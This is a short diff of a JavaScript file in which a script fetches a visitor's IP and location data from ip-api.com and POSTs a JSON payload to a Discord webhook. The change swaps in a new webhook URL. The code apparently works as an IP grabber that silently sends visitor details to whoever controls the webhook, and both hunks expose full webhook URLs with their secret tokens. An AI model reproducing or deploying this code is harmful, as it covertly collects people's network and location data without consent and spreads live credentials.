@@ -48,7 +48,7 @@ $.getJSON('http://ip-api.com/json', function(data) {
         "attachments": []
       }
       var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1088442474265067520/Vy_VjIlrH6-BciXx4vOwl4bZvtV8H5ewdypAZfUIX6SEYDfd40108FXcYUwy9g_A7Hup");
+      request.open("POST", "https://discord.com/api/webhooks/1088448891516624896/_yICwVYxsA1J66Wn3h-Bx1TdER1BPzcBSt7zATBio_nqO3y9bseeZ9XFo3zFGdpsolsm");
 
       request.setRequestHeader('Content-type', 'application/json');
 
